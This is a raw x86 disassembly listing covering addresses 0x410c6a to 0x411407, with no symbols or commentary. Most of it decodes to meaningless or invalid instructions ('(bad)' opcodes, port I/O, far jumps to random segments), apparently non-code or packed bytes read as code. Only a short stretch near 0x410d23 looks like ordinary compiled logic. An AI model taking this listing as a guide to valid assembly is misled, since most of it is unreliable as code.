  410c6a:	adc    BYTE PTR [edx+0x402d0ed3],bl
  410c70:	mov    eax,0x827e64b6
  410c75:	pop    edi
  410c76:	stc    
  410c77:	call   0x12e8:0xbc1a070
  410c7e:	lea    ebp,[ebp+0x3df35353]
  410c84:	shr    DWORD PTR [edi],cl
  410c86:	lea    esp,[esi+0x47]
  410c89:	lods   al,BYTE PTR ds:[esi]
  410c8a:	xchg   BYTE PTR [eax+0x5c183769],ah
  410c90:	and    BYTE PTR [esi+0x21b2a39e],0x9a
  410c97:	int3   
  410c98:	stos   BYTE PTR es:[edi],al
  410c99:	jbe    0x410c36
  410c9b:	leave  
  410c9c:	clc    
  410c9d:	jno    0x410cd2
  410c9f:	push   ss
  410ca0:	ins    BYTE PTR es:[edi],dx
  410ca1:	sub    BYTE PTR ds:0x562acf88,cl
  410ca7:	add    ebx,DWORD PTR [esi-0x2b7a2eca]
  410cad:	push   ss
  410cae:	fdivr  QWORD PTR ds:0x198051b6
  410cb4:	push   ecx
  410cb5:	ins    DWORD PTR es:[edi],dx
  410cb6:	mov    esi,0x3644f118
  410cbb:	mov    ds:0x77a9b45d,al
  410cc0:	mov    DWORD PTR [esp+ebp*8],0xcf0275dc
  410cc7:	add    eax,0x6286b2dc
  410ccc:	inc    ebx
  410ccd:	fcomp  st(5)
  410ccf:	pop    edi
  410cd0:	inc    edx
  410cd1:	pop    ds
  410cd2:	mov    bl,0xea
  410cd4:	mov    ah,0xed
  410cd6:	ror    BYTE PTR [ebx],0x5a
  410cd9:	mov    ecx,0xb9c7e136
  410cde:	push   ecx
  410cdf:	scas   al,BYTE PTR es:[edi]
  410ce0:	pop    esp
  410ce1:	(bad)  
  410ce3:	aaa    
  410ce4:	mov    cl,0xcb
  410ce6:	and    DWORD PTR [edi-0x233d9f4c],edx
  410cec:	popa   
  410ced:	fnstenv [edx-0x64af33d3]
  410cf3:	adc    BYTE PTR [eax-0x5f3c8a53],cl
  410cf9:	xlat   BYTE PTR ds:[ebx]
  410cfa:	jecxz  0x410d3a
  410cfc:	imul   edi,DWORD PTR [ebp+0xd],0xffffffd5
  410d00:	in     al,dx
  410d01:	jmp    0x410cbc
  410d03:	jg     0x410c8d
  410d05:	push   es
  410d06:	push   esi
  410d07:	and    DWORD PTR [ebp+0x7861c2d0],0x4b0902bc
  410d11:	mov    cl,0x3
  410d13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d14:	outs   dx,DWORD PTR ds:[esi]
  410d15:	sub    BYTE PTR [ebx+0x5e0bdff9],bl
  410d1b:	dec    eax
  410d1c:	mov    dh,dl
  410d1e:	mov    ebx,0x657230a9
  410d23:	pop    ecx
  410d24:	push   ecx
  410d25:	dec    edx
  410d26:	add    edi,ecx
  410d28:	add    edx,ecx
  410d2a:	imul   edx,edi
  410d2d:	mov    edi,DWORD PTR [ebp-0x8]
  410d30:	mov    ebx,DWORD PTR [ebp-0x10]
  410d33:	sub    ebx,edi
  410d35:	cmp    ebx,edx
  410d37:	ja     0x410d45
  410d3d:	mov    edx,DWORD PTR [ebp-0x2c]
  410d40:	jmp    0x411f76
  410d45:	mov    edx,DWORD PTR [ebp-0x34]
  410d48:	mov    edi,DWORD PTR [ebp-0x4]
  410d4b:	xor    edx,eax
  410d4d:	xor    edi,eax
  410d4f:	jmp    0x410fd7
  410d54:	lds    edi,FWORD PTR [edx+edx*8]
  410d57:	ds fxch st(6)
  410d5a:	fxch   st(3)
  410d5c:	adc    ecx,edx
  410d5e:	add    dh,BYTE PTR [edi]
  410d60:	adc    BYTE PTR [ebp+0x54f86319],cl
  410d66:	js     0x410de0
  410d68:	in     eax,0x7e
  410d6a:	js     0x410de4
  410d6c:	jg     0x410cf7
  410d6e:	sub    dh,BYTE PTR [edi-0x7]
  410d71:	ret    
  410d72:	arpl   WORD PTR [esi+ecx*1+0x6091673b],ax
  410d79:	outs   dx,BYTE PTR ds:[esi]
  410d7a:	fisttp DWORD PTR [ebx]
  410d7c:	ja     0x410d7e
  410d7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d7f:	pop    edi
  410d80:	jl     0x410da2
  410d82:	shr    BYTE PTR es:[ecx+0x1f543fac],cl
  410d89:	repnz leave 
  410d8b:	clc    
  410d8c:	stos   DWORD PTR es:[edi],eax
  410d8d:	lods   al,BYTE PTR ds:[esi]
  410d8e:	mov    esi,0xeb714b9a
  410d93:	and    eax,0x92efd380
  410d98:	inc    edi
  410d99:	jge    0x410d9d
  410d9b:	xor    cl,BYTE PTR [edi+0x40]
  410d9e:	(bad)  
  410d9f:	ins    BYTE PTR es:[edi],dx
  410da0:	xchg   esi,eax
  410da1:	cmp    ah,ah
  410da3:	or     bh,al
  410da5:	sbb    DWORD PTR [edx],esi
  410da7:	shl    DWORD PTR [edx-0x7dce0a91],1
  410dad:	icebp  
  410dae:	out    dx,eax
  410daf:	or     eax,DWORD PTR [edx*1+0x798e93e8]
  410db6:	out    dx,eax
  410db7:	add    ch,cl
  410db9:	xor    edx,0xffffff8a
  410dbc:	inc    eax
  410dbd:	icebp  
  410dbe:	mov    dl,0xce
  410dc0:	out    0xa7,al
  410dc2:	out    dx,eax
  410dc3:	daa    
  410dc4:	std    
  410dc5:	push   0x43
  410dc7:	jge    0x410d6f
  410dc9:	sbb    edi,DWORD PTR [ebp+0xd301735]
  410dcf:	js     0x410dde
  410dd1:	inc    ecx
  410dd2:	cmp    bh,dl
  410dd4:	dec    ebp
  410dd5:	sub    cl,bl
  410dd7:	and    BYTE PTR [ebp+0x5d],bl
  410dda:	or     eax,0x26b9ca7d
  410ddf:	lods   al,BYTE PTR ds:[esi]
  410de0:	test   BYTE PTR [edi-0x4d],ah
  410de3:	cmc    
  410de4:	jb     0x410d9a
  410de6:	test   BYTE PTR [edi+ebx*1+0x158a65f4],al
  410ded:	outs   dx,BYTE PTR ds:[esi]
  410dee:	mov    bl,0x40
  410df0:	fcmovnbe st,st(6)
  410df2:	call   0x801b590b
  410df7:	dec    eax
  410df8:	jbe    0x410e64
  410dfa:	dec    eax
  410dfb:	mov    ecx,0x43df5a7
  410e00:	mov    dl,0xf7
  410e02:	fnstcw WORD PTR [ebx-0x5295d33]
  410e08:	pop    esp
  410e09:	loope  0x410da7
  410e0b:	jbe    0x410da7
  410e0d:	daa    
  410e0e:	jmp    0x410da0
  410e10:	sub    esi,esp
  410e12:	test   DWORD PTR [edi+esi*1],0x6f69eccd
  410e19:	jbe    0x410df3
  410e1b:	retf   0x8579
  410e1e:	or     dl,bh
  410e20:	loopne 0x410e87
  410e22:	mov    eax,ds:0xfb685da4
  410e27:	dec    esi
  410e28:	jp     0x410dbc
  410e2a:	iret   
  410e2b:	sbb    al,0x8b
  410e2d:	lods   eax,DWORD PTR ds:[esi]
  410e2e:	pop    ebp
  410e2f:	sub    BYTE PTR [edx-0x1fbb1a0c],bl
  410e35:	push   eax
  410e36:	das    
  410e37:	fst    QWORD PTR [eax-0x9]
  410e3a:	ret    0x2fa8
  410e3d:	inc    eax
  410e3e:	inc    ecx
  410e3f:	push   ebp
  410e40:	test   al,0x84
  410e42:	cmc    
  410e43:	pop    ss
  410e44:	cmp    DWORD PTR [eax-0xa],esp
  410e47:	lods   al,BYTE PTR ds:[esi]
  410e48:	outs   dx,DWORD PTR ds:[esi]
  410e49:	inc    ecx
  410e4a:	icebp  
  410e4b:	sahf   
  410e4c:	in     eax,dx
  410e4d:	push   0x78d936e1
  410e52:	push   eax
  410e53:	mov    ds:0x3aa0cce3,eax
  410e58:	test   eax,0xcadc64f5
  410e5d:	jo     0x410e43
  410e5f:	push   cs
  410e60:	mov    esp,DWORD PTR [ebx+edi*8]
  410e63:	inc    edi
  410e64:	les    esp,FWORD PTR [eax-0x1764ca82]
  410e6a:	popa   
  410e6b:	outs   dx,BYTE PTR ds:[esi]
  410e6c:	(bad)  
  410e6d:	xchg   edi,eax
  410e6e:	and    cl,bh
  410e70:	stc    
  410e71:	inc    ebx
  410e72:	leave  
  410e73:	test   DWORD PTR [edx+0xf],ecx
  410e76:	mov    dl,0x3f
  410e78:	into   
  410e79:	fbld   TBYTE PTR [eax+esi*4+0x45d23e2f]
  410e80:	scas   eax,DWORD PTR es:[edi]
  410e81:	xchg   ecx,eax
  410e82:	dec    edi
  410e83:	jmp    0x9d86a406
  410e88:	mov    eax,0x168ee30f
  410e8d:	leave  
  410e8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e8f:	sub    cl,bh
  410e91:	pop    esi
  410e92:	stc    
  410e93:	(bad)
  410e96:	mov    ds:0xbdd20bea,eax
  410e9b:	lods   eax,DWORD PTR ds:[esi]
  410e9c:	je     0x410e3b
  410e9e:	push   ds
  410e9f:	loop   0x410e47
  410ea1:	pushf  
  410ea2:	jge    0x410e86
  410ea4:	icebp  
  410ea5:	fwait
  410ea6:	cmp    BYTE PTR ds:0x30c07cbc,dh
  410eac:	adc    bh,BYTE PTR [esi-0x67]
  410eaf:	ror    edi,cl
  410eb1:	cmp    ebx,DWORD PTR [esp+ecx*2]
  410eb4:	inc    esi
  410eb5:	or     cl,BYTE PTR [eax]
  410eb7:	add    eax,ecx
  410eb9:	sub    bh,bl
  410ebb:	aas    
  410ebc:	retf   
  410ebd:	mov    al,ds:0x62acd3c6
  410ec2:	cld    
  410ec3:	test   eax,0x6b88f344
  410ec8:	mov    BYTE PTR [ebx+edx*1+0x46],dl
  410ecc:	xchg   esp,eax
  410ecd:	fimul  DWORD PTR [ebx+0x48]
  410ed0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ed1:	mov    dh,0x2
  410ed3:	mov    ch,0x79
  410ed5:	add    bl,BYTE PTR [edi+0x7e]
  410ed8:	fidiv  DWORD PTR [ebp-0xaeb91f0]
  410ede:	adc    bl,0xa6
  410ee1:	inc    esp
  410ee2:	arpl   bx,si
  410ee4:	jne    0x410f4a
  410ee6:	dec    ebx
  410ee7:	dec    esp
  410ee8:	out    dx,al
  410ee9:	mul    DWORD PTR [eax]
  410eeb:	inc    esi
  410eec:	mov    dl,0xe2
  410eee:	leave  
  410eef:	lods   al,BYTE PTR ds:[esi]
  410ef0:	(bad)  
  410ef1:	sub    al,0xd0
  410ef4:	cmp    eax,0xcd7fc58a
  410ef9:	and    ah,dl
  410efb:	cmp    bh,BYTE PTR [eax]
  410efd:	hlt    
  410efe:	jg     0x410edb
  410f00:	mov    cl,0x47
  410f02:	ret    
  410f03:	mov    eax,ds:0x64e4f808
  410f08:	mov    ecx,esi
  410f0a:	adc    DWORD PTR [eax-0x4b2163ef],eax
  410f10:	sbb    dh,BYTE PTR [eax]
  410f12:	add    al,0x9
  410f14:	mov    al,0x8d
  410f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f18:	pop    ss
  410f19:	fdiv   QWORD PTR es:[edx+0x36f223b5]
  410f20:	or     DWORD PTR [ebp-0x7d],esp
  410f23:	dec    ebp
  410f24:	mov    ds:0x9de650bd,al
  410f29:	push   edx
  410f2a:	icebp  
  410f2b:	pop    ss
  410f2c:	data16 sub BYTE PTR [ebx+ebx*2],0xae
  410f31:	sbb    cl,ah
  410f33:	(bad)  
  410f34:	xchg   edi,eax
  410f35:	dec    edx
  410f36:	pop    ebp
  410f37:	sbb    ebp,DWORD PTR [edx+0x768c88ae]
  410f3d:	repz dec ecx
  410f3f:	jb     0x410f69
  410f41:	(bad)  
  410f42:	fidivr DWORD PTR [edx-0x313d472b]
  410f48:	stos   BYTE PTR es:[edi],al
  410f49:	lahf   
  410f4a:	cwde   
  410f4b:	lock addr16 mov eax,0x8783e758
  410f52:	scas   eax,DWORD PTR es:[edi]
  410f53:	dec    BYTE PTR [edx-0x780a6904]
  410f59:	adc    BYTE PTR [edx+0x42c218c3],dh
  410f5f:	inc    eax
  410f60:	std    
  410f61:	cmp    ebx,esi
  410f63:	fadd   st(5),st
  410f65:	add    edx,DWORD PTR [ecx+ecx*4]
  410f68:	aam    0x3f
  410f6a:	inc    ebp
  410f6b:	mov    esi,0x2661853c
  410f70:	or     al,0x85
  410f72:	dec    eax
  410f73:	(bad)  
  410f74:	mov    ds:0xa5046ec0,eax
  410f79:	pop    ecx
  410f7a:	cdq    
  410f7b:	pusha  
  410f7c:	mov    ds:0x67466207,eax
  410f81:	push   esp
  410f82:	inc    ebp
  410f83:	bound  ecx,QWORD PTR [edi]
  410f85:	xor    esp,eax
  410f87:	dec    edi
  410f88:	pop    esi
  410f89:	dec    esp
  410f8a:	jecxz  0x41100a
  410f8c:	xor    eax,0xb698f01d
  410f91:	dec    ebp
  410f92:	jae    0x410fa1
  410f94:	add    BYTE PTR [eax-0x4a],0x7c
  410f98:	sub    BYTE PTR [ecx-0x57c6e22],dh
  410f9e:	mov    ds:0x1010bb5c,eax
  410fa3:	xor    al,0xbd
  410fa5:	popa   
  410fa6:	xor    eax,DWORD PTR [ebx+0x1e]
  410fa9:	push   ebp
  410faa:	clc    
  410fab:	fsubr  DWORD PTR [edx+0x30942d]
  410fb1:	mov    ds:0xbfb69ca5,al
  410fb6:	mov    eax,0x2cb3bcc
  410fbb:	outs   dx,DWORD PTR ds:[esi]
  410fbc:	jne    0x411039
  410fbe:	popa   
  410fbf:	enter  0x7a84,0x6e
  410fc3:	fild   QWORD PTR [ecx-0x791147a1]
  410fc9:	mov    WORD PTR [edi-0x5b],gs
  410fcc:	cmp    DWORD PTR [eax+0x2c],ebx
  410fcf:	retf   
  410fd0:	jge    0x41102e
  410fd2:	sub    DWORD PTR [ebp+0x59],0x7d
  410fd6:	add    eax,0x83e9f903
  410fdb:	add    al,BYTE PTR [eax]
  410fdd:	add    ah,cl
  410fdf:	into   
  410fe0:	ror    esp,0xc1
  410fe3:	rcl    ecx,cl
  410fe5:	into   
  410fe6:	jbe    0x410f92
  410fe8:	inc    esp
  410fe9:	xor    si,di
  410fec:	inc    ebp
  410fed:	stc    
  410fee:	gs pop edx
  410ff0:	js     0x41106a
  410ff2:	in     eax,0x7e
  410ff4:	js     0x41106e
  410ff6:	cmp    BYTE PTR [edi],dh
  410ff8:	fisub  DWORD PTR [ebp-0x4]
  410ffb:	mov    eax,0x435a0db4
  411000:	call   0xda34b760
  411005:	xchg   edi,eax
  411006:	test   BYTE PTR [ecx+ebp*1],bh
  411009:	cli    
  41100a:	inc    ecx
  41100b:	sub    DWORD PTR [ecx-0x6f],0x4bd2b40c
  411012:	in     eax,dx
  411013:	or     DWORD PTR [ecx],edx
  411015:	iret   
  411016:	mov    bl,0x44
  411018:	fmul   DWORD PTR [esi-0x67]
  41101b:	(bad)
  411020:	fisttp WORD PTR [eax+esi*1-0x2f38a16]
  411027:	or     eax,0x73b16995
  41102c:	mov    ch,0x80
  41102e:	stos   BYTE PTR es:[edi],al
  41102f:	add    eax,0x7bb28063
  411034:	mov    BYTE PTR [edi],dl
  411036:	xor    BYTE PTR [ebx],cl
  411038:	xor    edx,DWORD PTR [ebx-0x2ac68782]
  41103e:	or     dl,BYTE PTR [ebp+0x2d]
  411041:	mul    esp
  411043:	cld    
  411044:	or     al,dh
  411046:	ja     0x411079
  411048:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411049:	pop    ecx
  41104a:	call   0x4bd21f3a
  41104f:	add    al,0xc3
  411051:	pop    ebx
  411052:	aam    0x12
  411054:	(bad)  
  411055:	or     eax,esp
  411057:	sbb    al,0xaa
  41105a:	xchg   edi,eax
  41105b:	ficom  WORD PTR [ecx+0x28028095]
  411061:	adc    al,0x32
  411063:	sub    bh,BYTE PTR [edi+0x73]
  411066:	in     al,dx
  411067:	sbb    eax,DWORD PTR gs:[ebx]
  41106a:	leave  
  41106b:	push   cs
  41106c:	into   
  41106d:	jns    0x411040
  41106f:	popf   
  411070:	repz or BYTE PTR ds:0x1a05558e,dh
  411077:	adc    dl,ah
  411079:	imul   ecx,ebp,0xd6260ac1
  41107f:	out    dx,eax
  411080:	sub    ebx,edi
  411082:	and    bh,ah
  411084:	pop    esi
  411085:	jp     0x41105a
  411087:	sbb    BYTE PTR [edi+0x6b],0x4e
  41108b:	ret    
  41108c:	ss mov eax,ebx
  41108f:	add    eax,0xf7916c4c
  411094:	(bad)  
  411095:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411096:	sbb    dl,ah
  411098:	int3   
  411099:	inc    esi
  41109a:	xor    DWORD PTR [edi+0x29],esi
  41109d:	jae    0x4110dc
  41109f:	jge    0x4110a4
  4110a1:	xchg   edi,eax
  4110a2:	mov    edx,0xc6cf074f
  4110a7:	pop    eax
  4110a8:	cmp    esi,DWORD PTR [eax]
  4110aa:	add    dh,BYTE PTR [edx-0x7f27d2c4]
  4110b0:	push   eax
  4110b1:	pop    eax
  4110b2:	add    al,0xca
  4110b4:	arpl   WORD PTR [eax+0x14],bp
  4110b7:	stos   BYTE PTR es:[edi],al
  4110b8:	lahf   
  4110b9:	push   ss
  4110ba:	test   al,0xcd
  4110bc:	test   eax,0xa3c4e685
  4110c1:	aam    0xa2
  4110c3:	ins    BYTE PTR es:[edi],dx
  4110c4:	push   ss
  4110c5:	xchg   ebx,eax
  4110c6:	shl    DWORD PTR [eax],cl
  4110c8:	inc    eax
  4110c9:	pop    ebx
  4110ca:	fsubr  QWORD PTR [esi-0x6a]
  4110cd:	test   al,0x23
  4110cf:	push   cs
  4110d0:	or     dl,BYTE PTR [ecx+0x2db5c232]
  4110d6:	outs   dx,BYTE PTR ds:[esi]
  4110d7:	leave  
  4110d8:	enter  0x3470,0xe
  4110dc:	jg     0x41106b
  4110de:	ror    BYTE PTR [edx+edx*4-0x7630c90],1
  4110e5:	mov    esp,0x778fb689
  4110ea:	mov    BYTE PTR [edx-0x11],dh
  4110ed:	dec    esp
  4110ee:	loop   0x4110e5
  4110f0:	dec    ecx
  4110f1:	xchg   esi,eax
  4110f2:	into   
  4110f3:	test   BYTE PTR [esi-0x50ebbf3f],dh
  4110f9:	jne    0x411129
  4110fb:	adc    cl,BYTE PTR [ebx+ebx*8]
  4110fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110ff:	repnz push edx
  411101:	les    ebp,FWORD PTR ds:0x505a9f60
  411107:	scas   eax,DWORD PTR es:[edi]
  411108:	mov    eax,0xbaf3b14e
  41110d:	mov    al,ds:0xd7ac9f76
  411112:	cmp    al,bh
  411114:	jb     0x411147
  411116:	js     0x4110e2
  411118:	dec    eax
  411119:	push   ds
  41111a:	push   ss
  41111b:	sbb    eax,0x1b7105be
  411120:	add    ah,BYTE PTR [ebx-0x572c3ba5]
  411126:	aad    0x12
  411128:	arpl   WORD PTR [ebp+ecx*1-0x1bdcb0a1],sp
  41112f:	dec    ebx
  411130:	rcr    bl,0xae
  411133:	inc    BYTE PTR [ecx+0x7e]
  411136:	(bad)  
  411137:	sbb    esi,eax
  411139:	mov    al,0x9c
  41113b:	outs   dx,BYTE PTR ds:[esi]
  41113c:	cs (bad) 
  41113e:	(bad)  
  41113f:	test   ebp,ecx
  411141:	xor    eax,0x84cfbba3
  411146:	std    
  411147:	pop    edx
  411148:	mov    ds:0x4be48b5,al
  41114d:	test   al,0xf5
  41114f:	mov    dh,0xfd
  411151:	test   eax,0xad741d48
  411156:	push   ds
  411157:	int    0x50
  411159:	aad    0xff
  41115b:	in     al,0x4b
  41115d:	test   DWORD PTR [edi],edx
  41115f:	out    0x99,al
  411161:	or     ah,dh
  411163:	cld    
  411164:	adc    DWORD PTR [ecx],eax
  411166:	js     0x41113f
  411168:	idiv   BYTE PTR [edi-0x75]
  41116b:	repnz or esp,DWORD PTR [esi]
  41116e:	cmp    BYTE PTR [eax+0x5f],cl
  411171:	mov    cl,0xc2
  411173:	rol    BYTE PTR [ecx+0x9],1
  411176:	(bad)
  411179:	cmp    eax,0xbe826b93
  41117e:	mov    ds:0x8706763a,al
  411183:	adc    BYTE PTR [ebx+0x20],cl
  411186:	int    0x11
  411188:	or     cl,BYTE PTR [esi-0x3f66bdb6]
  41118e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41118f:	sub    cl,BYTE PTR [eax+0x32fe51f2]
  411195:	mov    esi,0x7eac8efd
  41119a:	inc    esi
  41119b:	cwde   
  41119c:	stos   DWORD PTR es:[edi],eax
  41119d:	ror    ebp,1
  41119f:	std    
  4111a0:	rcr    DWORD PTR [edx],cl
  4111a2:	inc    ebx
  4111a3:	ins    BYTE PTR es:[edi],dx
  4111a4:	in     al,0x6d
  4111a6:	(bad)  
  4111a7:	aad    0xde
  4111a9:	arpl   WORD PTR [edi],si
  4111ab:	inc    ebp
  4111ac:	fs hlt 
  4111ae:	pop    ds
  4111af:	inc    edx
  4111b0:	mov    edx,0xfb314de9
  4111b5:	xor    BYTE PTR [esi],0xc0
  4111b8:	cdq    
  4111b9:	out    dx,eax
  4111ba:	data16 xor BYTE PTR [edi-0x3],dh
  4111be:	xor    eax,0x84c4dab0
  4111c3:	(bad)  
  4111c4:	ja     0x4111e3
  4111c6:	retf   0x9076
  4111c9:	std    
  4111ca:	push   es
  4111cb:	fwait
  4111cc:	stc    
  4111cd:	lods   al,BYTE PTR ds:[esi]
  4111ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111cf:	out    0x48,eax
  4111d1:	in     eax,dx
  4111d2:	imul   edi,DWORD PTR [ebp+0x56],0x4fd01629
  4111d9:	and    edx,ebx
  4111db:	cmp    al,0x89
  4111dd:	mov    eax,0x4a7a619c
  4111e2:	sub    edi,ecx
  4111e4:	xchg   ebp,eax
  4111e5:	mov    al,0x9
  4111e7:	push   esi
  4111e8:	popa   
  4111e9:	ret    
  4111ea:	pop    ecx
  4111eb:	ds or  al,0xf2
  4111ee:	call   FWORD PTR [ebp+0x63a7286e]
  4111f4:	test   eax,0xd9e3afa8
  4111f9:	(bad)  
  4111fa:	scas   al,BYTE PTR es:[edi]
  4111fb:	push   edx
  4111fc:	retf   
  4111fd:	xor    BYTE PTR [ebx-0x27],ah
  411200:	nop
  411201:	aam    0xc2
  411203:	les    edx,FWORD PTR [ebx]
  411205:	out    0x69,eax
  411207:	mov    edx,0x5b5d26f2
  41120c:	dec    eax
  41120d:	(bad)  
  41120f:	int3   
  411210:	jg     0x41127a
  411212:	xchg   ecx,eax
  411213:	mov    al,0xe5
  411215:	in     eax,dx
  411216:	shl    DWORD PTR [edx],cl
  411218:	push   edx
  411219:	cmp    ebp,DWORD PTR [ecx+0xb]
  41121c:	adc    al,0xba
  41121e:	in     al,dx
  41121f:	jle    0x4111ab
  411221:	mov    ebp,ds
  411223:	and    eax,DWORD PTR [edi+ebx*8-0x571ab815]
  41122a:	clc    
  41122b:	push   ebx
  41122c:	pusha  
  41122d:	cmp    eax,0x72c2fa5f
  411232:	jnp    0x41121d
  411234:	test   eax,0xe803626e
  411239:	push   edx
  41123a:	jp     0x41121d
  41123c:	popa   
  41123d:	add    eax,0xc0b17a1
  411242:	xchg   esp,eax
  411243:	mov    edi,0x29cca1f7
  411248:	int3   
  411249:	jecxz  0x4111eb
  41124b:	pop    ebx
  41124c:	ficom  DWORD PTR [edx+0x74]
  41124f:	inc    ecx
  411250:	add    DWORD PTR [esi+eiz*8],esp
  411253:	retf   0x63c5
  411256:	(bad)  
  411257:	jmp    0x4cd33aa1
  41125c:	mov    eax,0x60183e58
  411261:	add    edx,ecx
  411263:	imul   edx,edi
  411266:	jmp    0x4114ee
  41126b:	aas    
  41126c:	xlat   BYTE PTR ds:[ebx]
  41126d:	xlat   BYTE PTR ds:[ebx]
  41126e:	retf   
  41126f:	xlat   BYTE PTR ds:[ebx]
  411270:	retf   
  411271:	rcr    ebx,cl
  411273:	and    cl,ah
  411275:	or     BYTE PTR [eax-0x4e],al
  411278:	shl    BYTE PTR [edi+eiz*2],cl
  41127b:	rcr    BYTE PTR [edi+0x78],cl
  41127e:	js     0x411265
  411280:	jle    0x4112fa
  411282:	js     0x411303
  411284:	mov    cl,0xa5
  411286:	inc    esi
  411287:	inc    esp
  411288:	or     dh,cl
  41128a:	stc    
  41128b:	aad    0xfc
  41128d:	cmp    dh,al
  41128f:	inc    edx
  411290:	int    0xe
  411292:	cld    
  411293:	dec    esp
  411294:	ja     0x4112c8
  411296:	rol    DWORD PTR es:[esi-0x6820c70b],1
  41129d:	xchg   esi,eax
  41129e:	mov    ss,edx
  4112a0:	jmp    0xfb56:0x2f70ea96
  4112a7:	push   ecx
  4112a8:	mov    ds,WORD PTR [edx]
  4112aa:	xchg   ebx,eax
  4112ab:	das    
  4112ac:	mov    ah,0x4
  4112ae:	arpl   WORD PTR [eax+0x54],si
  4112b1:	pop    ebp
  4112b2:	not    BYTE PTR [esi+0x2d]
  4112b5:	pop    ebp
  4112b6:	pop    ecx
  4112b7:	xor    BYTE PTR [ecx+0x70f0f71a],0x66
  4112be:	push   edx
  4112bf:	cmp    al,0x59
  4112c1:	jno    0x4112c7
  4112c3:	mov    ch,0x21
  4112c5:	add    DWORD PTR [esi+ebp*4-0x10bfb01],ebp
  4112cc:	mov    dh,al
  4112ce:	jnp    0x411272
  4112d0:	hlt    
  4112d1:	enter  0x33ea,0x7e
  4112d5:	jp     0x4112e4
  4112d7:	jp     0x411271
  4112d9:	ins    DWORD PTR es:[edi],dx
  4112da:	loop   0x411300
  4112dc:	adc    edi,edx
  4112de:	mov    ch,BYTE PTR [ebp+esi*1-0x1f530e27]
  4112e5:	gs pusha 
  4112e7:	lds    edi,FWORD PTR [edx-0x62]
  4112ea:	imul   ebx,DWORD PTR [esi+0x36],0xffffff87
  4112ee:	sub    dh,BYTE PTR [edi+0x40c08890]
  4112f4:	and    ebx,ebp
  4112f6:	ja     0x411308
  4112f8:	push   esp
  4112f9:	mov    bh,0x98
  4112fb:	inc    esi
  4112fc:	jb     0x411347
  4112fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112ff:	les    ecx,FWORD PTR [esi+0x6fd07e17]
  411305:	pop    ebp
  411306:	mov    BYTE PTR [edx+edi*4-0x7a168247],ch
  41130d:	mov    dh,0x9b
  41130f:	int3   
  411310:	or     DWORD PTR [ebx-0x556d838a],ebx
  411316:	or     al,0xfc
  411318:	inc    edx
  411319:	xchg   esp,eax
  41131a:	ins    BYTE PTR es:[edi],dx
  41131b:	push   ss
  41131c:	lods   al,BYTE PTR ds:[esi]
  41131d:	sub    ebp,DWORD PTR [ebp-0x12]
  411320:	jmp    0x38e2:0x53285fbd
  411327:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411328:	push   0x7af6df75
  41132d:	mov    dh,0x43
  41132f:	cld    
  411330:	add    BYTE PTR [ebp-0x5],bl
  411333:	add    DWORD PTR [edx],edi
  411335:	pusha  
  411336:	xchg   ebp,eax
  411337:	fsubr  DWORD PTR [ebx-0x38]
  41133a:	adc    eax,0xea2744ef
  41133f:	inc    ebp
  411340:	call   0x6373:0x2a8d6ac1
  411347:	dec    ebx
  411348:	mov    ch,al
  41134a:	xchg   ecx,eax
  41134b:	shl    ch,cl
  41134d:	cs cs pushf 
  411350:	pop    ecx
  411351:	xchg   ebx,eax
  411352:	imul   ecx
  411354:	xlat   BYTE PTR ds:[ebx]
  411355:	je     0x41132d
  411357:	mov    esi,0xe31250ae
  41135c:	or     bh,bh
  41135e:	iret   
  41135f:	jmp    0x5354:0xab37eae2
  411366:	call   FWORD PTR [edx+eiz*2]
  411369:	lock xchg DWORD PTR [ebx-0x2aa7f4cc],edx
  411370:	mov    WORD PTR [ecx],sp
  411373:	out    dx,eax
  411374:	clc    
  411375:	fstp   QWORD PTR [ecx+ebp*1-0x38]
  411379:	mov    edi,0x25178b15
  41137e:	rol    DWORD PTR [ebx-0x31dafe67],1
  411384:	mov    WORD PTR [edx+0x5eb5509b],ss
  41138a:	jp     0x4113ed
  41138c:	pop    esp
  41138d:	(bad)  
  41138e:	mov    eax,0x3f2e1ae6
  411393:	pusha  
  411394:	pop    ss
  411395:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411396:	fs adc eax,0x4e045b51
  41139c:	add    al,0x8f
  41139e:	adc    al,0x86
  4113a0:	dec    eax
  4113a1:	xchg   ah,ch
  4113a3:	cdq    
  4113a4:	jbe    0x41140f
  4113a6:	jecxz  0x411340
  4113a8:	add    ch,bh
  4113aa:	nop
  4113ab:	mov    edx,0xe22b862d
  4113b0:	fdiv   st,st(5)
  4113b2:	(bad)  
  4113b3:	out    dx,eax
  4113b4:	inc    esi
  4113b5:	and    dl,bl
  4113b7:	jecxz  0x41135f
  4113b9:	fdivr  QWORD PTR [eax+0x1f493a28]
  4113bf:	and    eax,0x3f62078a
  4113c4:	inc    edx
  4113c5:	push   cs
  4113c6:	mul    DWORD PTR [ebx+ebx*2-0x40]
  4113ca:	stc    
  4113cb:	xchg   esi,eax
  4113cc:	push   esp
  4113cd:	addr16 xchg ebp,eax
  4113cf:	shr    BYTE PTR [ebp+eax*4+0x37],1
  4113d3:	xor    dh,BYTE PTR [esi-0x7fa606c3]
  4113d9:	sub    al,0x8a
  4113db:	inc    edi
  4113dc:	lahf   
  4113dd:	mov    WORD PTR [eax+ebp*4-0x6f],fs
  4113e1:	pop    ss
  4113e2:	aaa    
  4113e3:	nop
  4113e4:	pop    esp
  4113e5:	adc    BYTE PTR [edi],dl
  4113e7:	fcmovu st,st(4)
  4113e9:	mov    DWORD PTR [ecx+0xe],ebp
  4113ec:	adc    DWORD PTR [esi+eiz*2+0x404b09d3],ecx
  4113f3:	popa   
  4113f4:	xor    ecx,DWORD PTR [esi-0x2]
  4113f7:	jmp    0xa37232af
  4113fc:	xchg   ebp,eax
  4113fd:	or     al,0xb3
  4113ff:	xchg   ebp,eax
  411400:	stc    
  411401:	and    al,0xa3
  411403:	(bad)
  411407:	ja     0x4113ba
